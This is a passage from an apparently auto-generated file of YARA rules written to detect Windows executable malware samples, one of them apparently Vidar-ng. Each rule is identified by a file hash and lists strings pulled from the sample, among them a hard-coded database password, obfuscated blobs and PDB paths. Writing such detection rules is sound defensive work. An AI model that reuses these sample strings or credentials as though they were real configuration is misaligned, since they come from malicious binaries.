      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f {
   meta:
      description = "dataset - file d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "ComputerizedEmployeeRecord.LoginForm1.resources" fullword ascii /* score: '25.00'*/
      $s3 = "40yKvYu.exe" fullword wide /* score: '22.00'*/
      $s4 = "get_LoginForm1" fullword ascii /* score: '20.00'*/
      $s5 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s6 = "LoginForm1" fullword wide /* score: '16.00'*/
      $s7 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s8 = "set_LoginForm1" fullword ascii /* score: '15.00'*/
      $s9 = "m_LoginForm1" fullword ascii /* score: '15.00'*/
      $s10 = "get_LogoPictureBox" fullword ascii /* score: '14.00'*/
      $s11 = "get_OpenFileDialog1" fullword ascii /* score: '14.00'*/
      $s12 = "server=localhost;uid=sa;pwd=hamplustech; database=Computerized_Employee_Record_System" fullword wide /* score: '14.00'*/
      $s13 = "get_UsernameLabel" fullword ascii /* score: '12.00'*/
      $s14 = "PasswordTextBox" fullword wide /* score: '12.00'*/
      $s15 = "get_UsernameTextBox" fullword ascii /* score: '12.00'*/
      $s16 = "_PasswordLabel" fullword ascii /* score: '12.00'*/
      $s17 = "_PasswordTextBox" fullword ascii /* score: '12.00'*/
      $s18 = "get_AboutSystemToolStripMenuItem" fullword ascii /* score: '12.00'*/
      $s19 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s20 = "My.Computer" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20 {
   meta:
      description = "dataset - file 43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "SLuvHWY.exe" fullword wide /* score: '22.00'*/
      $s3 = "Resources\\1.1 - WelcomeScreen.txt" fullword wide /* score: '22.00'*/
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s5 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s6 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s7 = "get_DropBtn" fullword ascii /* score: '11.00'*/
      $s8 = "System_Windows_Markup_IComponentConnector_Connect" fullword ascii /* score: '10.00'*/
      $s9 = "System.Windows.Window" fullword ascii /* score: '10.00'*/
      $s10 = "get_Solo0342" fullword ascii /* score: '9.00'*/
      $s11 = "get_Solo1342" fullword ascii /* score: '9.00'*/
      $s12 = "get_QuitBtn" fullword ascii /* score: '9.00'*/
      $s13 = "get_FDcUlEZ" fullword ascii /* score: '9.00'*/
      $s14 = "get_CharacterBtn" fullword ascii /* score: '9.00'*/
      $s15 = "get_ExitBtn" fullword ascii /* score: '9.00'*/
      $s16 = "get_ItemsWindow" fullword ascii /* score: '9.00'*/
      $s17 = "get_BtoMain_Menu" fullword ascii /* score: '9.00'*/
      $s18 = "get_ItemsBtn" fullword ascii /* score: '9.00'*/
      $s19 = "get_ExitBtnn" fullword ascii /* score: '9.00'*/
      $s20 = "get_Bold_Text" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172 {
   meta:
      description = "dataset - file a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADG" fullword ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "TODOList.Login.resources" fullword ascii /* score: '22.00'*/
      $s6 = "xXjKlvi1RGb55rq.exe" fullword ascii /* score: '22.00'*/
      $s7 = "IMessa.exe" fullword wide /* score: '22.00'*/
      $s8 = "]DfpesU5em8ZUDrogDD[]o{5XDfpesUZ\\oMKdX8VeoU6f8QIDnIZ]|kJYDPK]ykJgo4HgogHDy]peMU5erU[]QET]zoKYDnKel4Z]}Q[TD35en8Z\\VEDPxEjP}TqeM" ascii /* score: '21.00'*/
      $s9 = "4D65737361676544696374696F6E617279456E756D65726174" wide /* score: '17.00'*/ /* hex encoded string 'MessageDictionaryEnumerat' */
      $s10 = "585544693859" wide /* score: '17.00'*/ /* hex encoded string 'XUDi8Y' */
      $s11 = "EDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDE' */ /* score: '16.50'*/
      $s12 = "FDDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDDF' */ /* score: '16.50'*/
      $s13 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s14 = "@DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD" ascii /* score: '15.00'*/
      $s15 = "TODOList.components.AfTextBox.resources" fullword ascii /* score: '14.00'*/
      $s16 = "TODOList.components" fullword ascii /* score: '14.00'*/
      $s17 = "TODOList.components.addTaskBox.resources" fullword ascii /* score: '14.00'*/
      $s18 = "@DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD@' */ /* score: '14.00'*/
      $s19 = "TODOList.components.TaskBox.resources" fullword ascii /* score: '14.00'*/
      $s20 = "TODOList.components.Test.resources" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_2bd9c0ae977d28d89bc7e590e0996274 {
   meta:
      description = "dataset - file 2bd9c0ae977d28d89bc7e590e0996274"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "9edcf9664940435399ce1093902470cd617994b5b1d502fdf17800329ac18242"
   strings:
      $s1 = "      <assemblyIdentity language=\"*\" name=\"Microsoft.Windows.Common-Controls\" processorArchitecture=\"*\" publicKeyToken=\"6" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "pyreadline.logger)" fullword ascii /* score: '24.00'*/
      $s4 = "bpython3.dll" fullword ascii /* score: '23.00'*/
      $s5 = "bpython37.dll" fullword ascii /* score: '23.00'*/
      $s6 = "pyreadline.keysyms.common)" fullword ascii /* score: '20.00'*/
      $s7 = "blibcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s8 = "blibssl-1_1.dll" fullword ascii /* score: '20.00'*/
      $s9 = "%python37.dll" fullword ascii /* score: '20.00'*/
      $s10 = "  <assemblyIdentity name=\"test2\" processorArchitecture=\"amd64\" type=\"win32\" version=\"1.0.0.0\"/>" fullword ascii /* score: '19.00'*/
      $s11 = "distutils.log)" fullword ascii /* score: '19.00'*/
      $s12 = "      <assemblyIdentity language=\"*\" name=\"Microsoft.Windows.Common-Controls\" processorArchitecture=\"*\" publicKeyToken=\"6" ascii /* score: '19.00'*/
      $s13 = "https://sectigo.com/CPS0C" fullword ascii /* score: '17.00'*/
      $s14 = "GNDNFNENG" fullword ascii /* base64 encoded string '43E4CF' */ /* score: '16.50'*/
      $s15 = "GVDVFVEVG" fullword ascii /* base64 encoded string 'T5ETEF' */ /* score: '16.50'*/
      $s16 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s17 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii /* score: '16.00'*/
      $s18 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii /* score: '16.00'*/
      $s19 = "unittest.loader)" fullword ascii /* score: '16.00'*/
      $s20 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      8 of them
}

rule sig_2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252ff64281 {
   meta:
      description = "dataset - file 2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252ff64281"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252ff64281"
   strings:
      $s1 = "eppeedf.dll" fullword ascii /* score: '23.00'*/
      $s2 = "NPJava12.dll" fullword wide /* score: '23.00'*/
      $s3 = "self.exe" fullword ascii /* score: '22.00'*/
      $s4 = " testapp.exe" fullword ascii /* score: '19.00'*/
      $s5 = "FTTTGR.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "LdrGetProcedureAIsThreadAFiber" fullword ascii /* score: '12.00'*/
      $s7 = " attualmente selezionato come versione di Java predefinita per il browser." fullword wide /* score: '10.00'*/
      $s8 = " la versione di Java predefinita per il browser. Per impostare Sun Java come versione predefinita, selezione Strumenti->Opzioni " wide /* score: '10.00'*/
      $s9 = "ntdll.dl" fullword wide /* score: '9.00'*/
      $s10 = "content2,the7" fullword wide /* score: '9.00'*/
      $s11 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s12 = "cessitent une version de java diff" fullword wide /* score: '9.00'*/
      $s13 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s14 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s15 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s16 = "d$7*D$s:\\$7" fullword ascii /* score: '7.00'*/
      $s17 = "rtig vom Browser verwendete Java-Version. Um das/die Applet(s) auf dieser HTML-Seite ausf" fullword wide /* score: '7.00'*/
      $s18 = "n de Java elegida como predeterminada para el navegador." fullword wide /* score: '7.00'*/
      $s19 = "n predeterminada del navegador. Para seleccionar Sun Java como opci" fullword wide /* score: '7.00'*/
      $s20 = "cuter la ou les applet(s) de la page HTML, vous devez utiliser une nouvelle session. Cliquez sur 'Oui' pour lancer une nouvelle " wide /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea {
   meta:
      description = "dataset - file a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s2 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s5 = "dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 't                                                                                    ' */ /* score: '14.00'*/
      $s6 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s7 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s8 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii /* score: '13.00'*/
      $s9 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s10 = "QJxy6z'" fullword ascii /* score: '4.00'*/
      $s11 = "DigiCert Timestamp 20210" fullword ascii /* score: '4.00'*/
      $s12 = "DigiCert, Inc.1 0" fullword ascii /* score: '4.00'*/
      $s13 = "dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp" fullword ascii /* score: '4.00'*/
      $s14 = "DigiCert Trusted Root G40" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "DigiCert, Inc.1A0?" fullword ascii /* score: '4.00'*/
      $s16 = "8DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA10" fullword ascii /* score: '2.00'*/
      $s17 = "8DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1" fullword ascii /* score: '2.00'*/
      $s18 = "210101000000Z" fullword ascii /* score: '1.00'*/
      $s19 = "31010712" ascii /* score: '1.00'*/
      $s20 = "dwc_#Ri" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      8 of them
}

rule sig_1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f {
   meta:
      description = "dataset - file 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
   strings:
      $s1 = "Configuration.dll" fullword ascii /* score: '26.00'*/
      $s2 = "Z:\\vidar-ng\\Vidar-ng\\x64\\Release\\Configuration.pdb" fullword ascii /* score: '22.00'*/
      $s3 = "C:\\Windows\\splwow64.exe" fullword ascii /* score: '21.00'*/
      $s4 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s5 = "https://secure.comodo.com/CPS0L" fullword ascii /* score: '17.00'*/
      $s6 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s7 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s8 = "Dhttp://crt.comodoca.com/COMODORSAExtendedValidationCodeSigningCA.crt0$" fullword ascii /* score: '13.00'*/
      $s9 = "Dhttp://crl.comodoca.com/COMODORSAExtendedValidationCodeSigningCA.crl0" fullword ascii /* score: '13.00'*/
      $s10 = "Cplapplet" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00'*/
      $s11 = ".COMODO RSA Extended Validation Code Signing CA" fullword ascii /* score: '9.00'*/
      $s12 = ".COMODO RSA Extended Validation Code Signing CA0" fullword ascii /* score: '9.00'*/
      $s13 = "hrmagazine.micro" fullword ascii /* score: '7.00'*/
      $s14 = "MS Corporation Sofware Ltd1#0!" fullword ascii /* score: '6.00'*/
      $s15 = "MS Corporation Sofware Ltd0" fullword ascii /* score: '6.00'*/
      $s16 = "Ruyaknjoo" fullword ascii /* score: '6.00'*/
      $s17 = "COMODO CA Limited1705" fullword ascii /* score: '5.00'*/
      $s18 = "I -L8l" fullword ascii /* score: '5.00'*/
      $s19 = "YKejAN3" fullword ascii /* score: '5.00'*/
      $s20 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.85'*/ /* Goodware String - occured 153 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_532e97e0ff4498854440784c6e7bcb8ed84ca654fb4acf893e8255b8a8c37911 {
   meta:
      description = "dataset - file 532e97e0ff4498854440784c6e7bcb8ed84ca654fb4acf893e8255b8a8c37911"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "532e97e0ff4498854440784c6e7bcb8ed84ca654fb4acf893e8255b8a8c37911"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "nstall System v3.05</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requested" ascii /* score: '16.00'*/
      $s4 = "ecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:sch" ascii /* score: '14.00'*/
      $s5 = "JKPO:\"" fullword ascii /* score: '10.00'*/
      $s6 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s7 = "6-80e1-4239-95bb-83d0f6d0da78}\"/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-5d96-4" ascii /* score: '7.00'*/
      $s8 = "vHI.Kic" fullword ascii /* score: '7.00'*/
      $s9 = "UXTHEME" fullword ascii /* score: '6.50'*/
      $s10 = "APPHELP" fullword ascii /* score: '6.50'*/
      $s11 = "PROPSYS" fullword ascii /* score: '6.50'*/
      $s12 = "NTMARTA" fullword ascii /* score: '6.50'*/
      $s13 = "microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f6" ascii /* score: '6.00'*/
      $s14 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '6.00'*/
      $s15 = "dRPjNxi29" fullword ascii /* score: '5.00'*/
      $s16 = "cNmRGv6" fullword ascii /* score: '5.00'*/
      $s17 = "<[+ lM" fullword ascii /* score: '5.00'*/
      $s18 = "+? -B8" fullword ascii /* score: '5.00'*/
      $s19 = "\"%a% r" fullword ascii /* score: '5.00'*/
      $s20 = "DIsLmV27" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330 {
   meta:
      description = "dataset - file ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
   strings:
      $s1 = "HAAAAAAAA" fullword ascii /* base64 encoded string '      ' */ /* reversed goodware string 'AAAAAAAAH' */ /* score: '26.50'*/
      $s2 = "C:\\Users\\dev\\Desktop\\" fullword ascii /* score: '24.00'*/
      $s3 = "Dll6.dll" fullword ascii /* score: '20.00'*/
      $s4 = "\\Dll6\\x64\\Release\\Dll6.pdb" fullword ascii /* score: '19.00'*/
      $s5 = "Attempted to free unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s6 = "Attempted to realloc unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s7 = "Attempted to realloc %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s8 = "Attempted to free %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s9 = "invalid decoded scanline length" fullword ascii /* score: '16.00'*/
      $s10 = "stb.log" fullword ascii /* score: '16.00'*/
      $s11 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s12 = "Changed: %s - %08x:%08x" fullword ascii /* score: '15.00'*/
      $s13 = "s%s% :s%" fullword ascii /* reversed goodware string '%s: %s%s' */ /* score: '15.00'*/
      $s14 = "Eyedropped tile that isn't in tileset" fullword ascii /* score: '11.00'*/
      $s15 = "bad zlib header" fullword ascii /* score: '11.00'*/
      $s16 = "%s/%s.cfg" fullword ascii /* score: '11.00'*/
      $s17 = "no header height" fullword ascii /* score: '11.00'*/
      $s18 = "bad Image Descriptor" fullword ascii /* score: '10.00'*/
      $s19 = "tnld.lld" fullword ascii /* score: '10.00'*/
      $s20 = "Checked %d-byte block %p previously freed/realloced at %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule a390038e21cbf92c36987041511dcd8dcfe836ebbabee733349e0b17af9ad4eb {
   meta:
      description = "dataset - file a390038e21cbf92c36987041511dcd8dcfe836ebbabee733349e0b17af9ad4eb"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a390038e21cbf92c36987041511dcd8dcfe836ebbabee733349e0b17af9ad4eb"
   strings:
      $s1 = "Kp{%H%" fullword ascii /* score: '5.00'*/
      $s2 = "windir" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 47 times */
      $s3 = "HRoY>7R.Oi" fullword ascii /* score: '4.00'*/
      $s4 = ".HZo[>" fullword ascii /* score: '4.00'*/
      $s5 = "DceRpcSs" fullword ascii /* score: '4.00'*/
      $s6 = "8LTl/x" fullword ascii /* score: '1.00'*/
      $s7 = "pJ7;pJ7/pJ7" fullword ascii /* score: '1.00'*/
      $s8 = "K'{Xb'" fullword ascii /* score: '1.00'*/
      $s9 = "mJ74mJ7" fullword ascii /* score: '1.00'*/
      $s10 = "l[K$PS" fullword ascii /* score: '1.00'*/
      $s11 = "7R0N$R;" fullword ascii /* score: '1.00'*/
      $s12 = "KOz-K'l" fullword ascii /* score: '1.00'*/
      $s13 = "H7zxK'" fullword ascii /* score: '1.00'*/
      $s14 = "K'-`m$" fullword ascii /* score: '1.00'*/
      $s15 = "Kw{+R&" fullword ascii /* score: '1.00'*/
      $s16 = "[O37I7{" fullword ascii /* score: '1.00'*/
      $s17 = "Rc/>7l" fullword ascii /* score: '1.00'*/
      $s18 = "9R0I$C" fullword ascii /* score: '1.00'*/
      $s19 = "[OS7I7{" fullword ascii /* score: '1.00'*/
      $s20 = "'HR#[6" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f {
   meta:
      description = "dataset - file 1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f"
   strings:
      $s1 = "g0E -e" fullword ascii /* score: '5.00'*/
      $s2 = "g0- U[" fullword ascii /* score: '5.00'*/
      $s3 = " -P:7-}" fullword ascii /* score: '5.00'*/
      $s4 = "windir" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 47 times */
      $s5 = "DceRpcSs" fullword ascii /* score: '4.00'*/
      $s6 = "tFIcH<L" fullword ascii /* score: '4.00'*/
      $s7 = "tQHcJ<H" fullword ascii /* score: '4.00'*/
      $s8 = "tKIc@<H" fullword ascii /* score: '4.00'*/
      $s9 = "tLIcC<L" fullword ascii /* score: '4.00'*/
      $s10 = "\\5q'm8x)f/c;{\"j5pi" fullword ascii /* score: '2.00'*/
      $s11 = "%s\\System32\\%s" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s12 = "a7B/1?z/-0H" fullword ascii /* score: '1.00'*/
      $s13 = ":&/c;{6" fullword ascii /* score: '1.00'*/
      $s14 = "GCC: (GNU) 8.3-win32 20190406" fullword ascii /* score: '1.00'*/
      $s15 = "S5D$z}" fullword ascii /* score: '1.00'*/
      $s16 = "\"0MxB/" fullword ascii /* score: '1.00'*/
      $s17 = "7:<N6k" fullword ascii /* score: '1.00'*/
      $s18 = "K.U, %" fullword ascii /* score: '1.00'*/
      $s19 = "a5B/15" fullword ascii /* score: '1.00'*/
      $s20 = ":7c~F0" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_8837868b6279df6a700b3931c31e4542a47f7476f50484bdf907450a8d8e9408 {
   meta:
      description = "dataset - file 8837868b6279df6a700b3931c31e4542a47f7476f50484bdf907450a8d8e9408"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8837868b6279df6a700b3931c31e4542a47f7476f50484bdf907450a8d8e9408"
   strings:
      $s1 = "ap6Qj}?_wj$M|g-CMD" fullword ascii /* score: '6.00'*/
      $s2 = "windir" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 47 times */
      $s3 = "DceRpcSs" fullword ascii /* score: '4.00'*/
      $s4 = "^TtwZT|G^Pu" fullword ascii /* score: '4.00'*/
      $s5 = "RRtP^Td" fullword ascii /* score: '4.00'*/
      $s6 = "OZTtP^R" fullword ascii /* score: '4.00'*/
      $s7 = "PtwRP\\" fullword ascii /* score: '4.00'*/
      $s8 = "p^T|gRPLg^Pt" fullword ascii /* score: '4.00'*/
      $s9 = "NjMy;CYy=Z" fullword ascii /* score: '4.00'*/
      $s10 = "RRLPZTt" fullword ascii /* score: '4.00'*/
      $s11 = "WTqOW\\" fullword ascii /* score: '4.00'*/
      $s12 = "ZTtw^Td" fullword ascii /* score: '4.00'*/
      $s13 = "OZTtP^T|P" fullword ascii /* score: '4.00'*/
      $s14 = "ORTwL^Te" fullword ascii /* score: '4.00'*/
      $s15 = "PLOWm![" fullword ascii /* score: '4.00'*/
      $s16 = "ZRtP^RdX^R|@" fullword ascii /* score: '4.00'*/
      $s17 = "^TdwWa!" fullword ascii /* score: '4.00'*/
      $s18 = "RtwZT|_" fullword ascii /* score: '4.00'*/
      $s19 = "^RlWRR|oZRd" fullword ascii /* score: '4.00'*/
      $s20 = "RTqNRQt" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0 {
   meta:
      description = "dataset - file f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "D:\\PuRYxixetS3\\K1InIdoz\\ezoZ\\oN2T\\MFSDSvwj\\8bCL6P6P.pdb" fullword ascii /* score: '17.00'*/
      $s2 = "invalid vector subscript" fullword ascii /* score: '12.00'*/
      $s3 = "5oHw7ulOF0LwdI98LI9gpMLu14JW1ElMXWlyLo1MdoHGl4L8xmJyxwPkbk7k5KNgx0P0nqXUFGTYHGD4B67O5QtuN0rqJCz8DWbCduvaLCNMpiRafK5S1APi" fullword ascii /* score: '11.00'*/
      $s4 = ".data$rs" fullword ascii /* score: '8.00'*/
      $s5 = "vector too long" fullword ascii /* score: '6.00'*/
      $s6 = "WINDOWSPROJECT1" fullword wide /* score: '5.00'*/
      $s7 = "WindowsProject1" fullword wide /* score: '5.00'*/
      $s8 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s9 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s10 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
